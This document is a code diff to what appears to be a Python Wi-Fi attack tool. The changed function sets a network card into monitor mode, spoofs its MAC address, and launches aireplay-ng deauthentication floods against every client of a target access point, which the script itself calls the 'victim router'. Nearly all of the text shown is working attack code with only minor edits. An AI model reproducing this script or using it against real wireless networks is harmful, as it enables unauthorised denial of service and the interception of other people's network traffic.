@@ -118,6 +118,7 @@ def attack_func(network_interface, attack_mode):
     time.sleep(1)
     subprocess.run(["clear"])
     get_colours("\n[*] Setting up network card...", "yellow")
+    os.system(f"sudo ifconfig {network_interface} down")  # To Avoid channel problems.
     subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
     get_colours("\n[!] Generating new Mac Address...", "cyan")
     time.sleep(3)
@@ -233,7 +234,8 @@ def attack_func(network_interface, attack_mode):
             process.kill()
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface}mon &")
-        os.system(f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        os.system(
+            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
         subprocess.run(["clear"])
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
